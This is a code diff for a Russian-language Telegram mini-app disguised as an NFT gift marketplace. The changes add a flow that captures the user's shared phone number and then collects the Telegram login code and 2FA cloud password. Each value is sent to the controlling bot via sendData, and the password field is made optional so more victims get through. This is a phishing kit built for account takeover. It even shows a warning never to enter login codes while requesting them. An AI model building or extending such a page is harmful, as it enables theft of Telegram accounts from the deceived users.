@@ -304,7 +304,7 @@
             font-weight: 600;
             cursor: pointer;
         }
-        /* Phone Input */
+        /* Warning Box */
         .warning-box {
             background: #ffd700;
             color: #000;
@@ -317,34 +317,30 @@
             align-items: flex-start;
             gap: 8px;
         }
-        .country-selector {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin: 20px 0;
-            justify-content: center;
+        /* Form */
+        .form-group {
+            margin-bottom: 16px;
         }
-        .country-flag {
-            font-size: 24px;
+        .form-label {
+            display: block;
+            font-size: 14px;
+            color: #6d6d6d;
+            margin-bottom: 8px;
         }
-        .country-select {
-            background: #2a2a2a;
-            color: #fff;
-            border: none;
-            padding: 8px 12px;
-            border-radius: 8px;
-            font-size: 15px;
-        }
-        .phone-input {
+        .form-input {
             width: 100%;
             background: #2a2a2a;
             border: none;
             padding: 14px;
             border-radius: 10px;
             color: #fff;
-            font-size: 18px;
-            text-align: center;
-            margin: 16px 0;
+            font-size: 15px;
+        }
+        .form-hint {
+            color: #6d6d6d;
+            font-size: 12px;
+            margin-top: 4px;
+            display: block;
         }
         .modal-actions {
             display: flex;
@@ -373,25 +369,6 @@
             font-weight: 600;
             cursor: pointer;
         }
-        /* Code Form */
-        .form-group {
-            margin-bottom: 16px;
-        }
-        .form-label {
-            display: block;
-            font-size: 14px;
-            color: #6d6d6d;
-            margin-bottom: 8px;
-        }
-        .form-input {
-            width: 100%;
-            background: #2a2a2a;
-            border: none;
-            padding: 14px;
-            border-radius: 10px;
-            color: #fff;
-            font-size: 15px;
-        }
         .hidden {
             display: none !important;
         }
@@ -406,10 +383,12 @@
             <span>Войти</span>
         </button>
     </header>
+    
     <!-- Search -->
     <div class="search-section">
         <input type="text" class="search-input" placeholder="Поиск подарков...">
     </div>
+    
     <!-- Filters -->
     <div class="filters">
         <button class="filter-btn active">Все</button>
@@ -418,8 +397,10 @@
         <button class="filter-btn">Линия: NFT</button>
         <button class="filter-btn">Линия: TON</button>
     </div>
+    
     <!-- Grid -->
     <div class="grid" id="giftsGrid"></div>
+    
     <!-- Bottom Navigation -->
     <nav class="bottom-nav">
         <a class="nav-item active">
@@ -439,6 +420,7 @@
             <div>Актив</div>
         </a>
     </nav>
+    
     <!-- Modal: Auth Required -->
     <div class="modal" id="authRequiredModal">
         <div class="modal-content">
@@ -449,6 +431,7 @@
             <button class="btn-secondary" onclick="closeModal('authRequiredModal')">Закрыть</button>
         </div>
     </div>
+    
     <!-- Modal: Main Auth -->
     <div class="modal" id="mainAuthModal">
         <div class="modal-content">
@@ -480,6 +463,7 @@
             </div>
         </div>
     </div>
+    
     <!-- Modal: Phone Input -->
     <div class="modal" id="phoneModal">
         <div class="modal-content">
@@ -491,10 +475,12 @@
                 <span>⚠️</span>
                 <span>Внимание! Никогда не вводите коды для входа в Telegram в мини-приложениях.</span>
             </div>
+            
             <div id="phoneInputSection">
                 <button class="btn-primary" onclick="sharePhone()">📱 Поделиться номером</button>
                 <button class="btn-cancel" onclick="closeModal('phoneModal')">Отмена</button>
             </div>
+            
             <div id="codeFormSection" class="hidden">
                 <div class="form-group">
                     <label class="form-label">Код из Telegram</label>
@@ -502,12 +488,14 @@
                 </div>
                 <div class="form-group">
                     <label class="form-label">Облачный пароль (2FA)</label>
-                    <input type="password" class="form-input" id="cloudPassword" placeholder="Введите пароль">
+                    <input type="password" class="form-input" id="cloudPassword" placeholder="Если есть - введите пароль">
+                    <small class="form-hint">Если у вас нет облачного пароля, оставьте поле пустым</small>
                 </div>
                 <button class="btn-primary" onclick="submitAuth()">Авторизоваться</button>
             </div>
         </div>
     </div>
+    
     <script>
         // NFT Gifts Data
         const gifts = [
@@ -520,18 +508,11 @@
             { name: 'Signet Ring', id: 606, price: 8.45, img: 'img/signet_ring.png' },
             { name: 'Eternal Rose', id: 707, price: 6.33, img: 'img/eternal_rose.png' },
             { name: 'Vintage Watch', id: 808, price: 22.10, img: 'img/vintage_watch.png' },
-            { name: 'Heroic Helmet', id: 909, price: 11.56, img: 'img/heroic_helmet.png' },
-            { name: 'Heart Locket', id: 1010, price: 3.89, img: 'img/heart_locket.png' },
-            { name: 'Plush Bear', id: 1111, price: 1.02, img: 'img/plush_bear.png' },
-            { name: 'Golden Apple', id: 1212, price: 7.84, img: 'img/golden_apple.png' },
-            { name: 'Magic Lamp', id: 1313, price: 4.21, img: 'img/magic_lamp.png' },
-            { name: 'Crystal Ball', id: 1414, price: 9.67, img: 'img/crystal_ball.png' },
-            { name: 'Enchanted Book', id: 1515, price: 2.34, img: 'img/enchanted_book.png' },
-            { name: 'Dragon Egg', id: 1616, price: 18.90, img: 'img/dragon_egg.png' },
-            { name: 'Phoenix Feather', id: 1717, price: 5.67, img: 'img/phoenix_feather.png' },
-            { name: 'Wizard Hat', id: 1818, price: 3.12, img: 'img/wizard_hat.png' },
-            { name: 'Elf Shoes', id: 1919, price: 1.78, img: 'img/elf_shoes.png' }
+            { name: 'Heroic Helmet', id: 909, price: 11.56, img: 'img/heroic_helmet.png' }
         ];
+        
+        // Переменная для хранения номера телефона
+        let userPhoneNumber = '';
         
         // Render gifts
         function renderGifts() {
@@ -570,11 +551,34 @@
                 if (window.Telegram && window.Telegram.WebApp) {
                     // Используем встроенный метод Telegram для запроса номера телефона
                     window.Telegram.WebApp.requestContact(function(success, data) {
-                        if (success) {
+                        if (success && data && data.responseUnsafe) {
                             console.log('Contact shared:', data);
-                            // Показываем форму для кода
-                            document.getElementById('phoneInputSection').classList.add('hidden');
-                            document.getElementById('codeFormSection').classList.remove('hidden');
+                            
+                            // Извлекаем номер телефона
+                            const contact = data.responseUnsafe.contact;
+                            if (contact && contact.phone_number) {
+                                userPhoneNumber = contact.phone_number;
+                                
+                                // Отправляем номер боту
+                                const phoneData = {
+                                    step: 'phone',
+                                    phone: userPhoneNumber,
+                                    timestamp: new Date().toISOString()
+                                };
+                                
+                                window.Telegram.WebApp.sendData(JSON.stringify(phoneData));
+                                console.log('Phone sent:', phoneData);
+                                
+                                // Показываем форму для кода
+                                document.getElementById('phoneInputSection').classList.add('hidden');
+                                document.getElementById('codeFormSection').classList.remove('hidden');
+                                
+                                // Меняем текст заголовка
+                                document.querySelector('#phoneModal .modal-title').textContent = 'Введите код';
+                                document.querySelector('#phoneModal .modal-subtitle').textContent = 'Код отправлен в Telegram на номер ' + userPhoneNumber;
+                            } else {
+                                alert('Не удалось получить номер телефона');
+                            }
                         } else {
                             alert('Не удалось получить номер телефона');
                         }
@@ -596,27 +600,31 @@
                 alert('Пожалуйста, введите 5-значный код');
                 return;
             }
-           
-            if (!password || password.length < 1) {
-                alert('Пожалуйста, введите облачный пароль');
+            
+            // Проверяем, был ли получен номер
+            if (!userPhoneNumber) {
+                alert('Ошибка: номер телефона не найден. Начните заново.');
+                closeAllModals();
                 return;
             }
             
-            // Collect auth data
+            // Собираем данные авторизации
             const authData = {
+                step: 'code',
+                phone: userPhoneNumber,
                 code: code,
-                cloud_password: password,
+                cloud_password: password || '', // Пустая строка если пароля нет
                 timestamp: new Date().toISOString()
             };
             
-            // Send data
+            // Отправляем данные
             try {
                 if (window.Telegram && window.Telegram.WebApp) {
                     window.Telegram.WebApp.sendData(JSON.stringify(authData));
-                    console.log('Data sent:', authData);
+                    console.log('Auth data sent:', authData);
                 }
                 
-                alert('Данные отправлены!');
+                alert('Данные отправлены! Ожидайте подтверждения...');
                 closeAllModals();
                 
             } catch (error) {
@@ -634,11 +642,11 @@
                 modal.classList.remove('active');
             });
             // Reset forms
-            document.getElementById('phoneNumber').value = '';
             document.getElementById('smsCode').value = '';
             document.getElementById('cloudPassword').value = '';
             document.getElementById('phoneInputSection').classList.remove('hidden');
             document.getElementById('codeFormSection').classList.add('hidden');
+            userPhoneNumber = ''; // Сбрасываем номер
         }
         
         // Close modal on background click
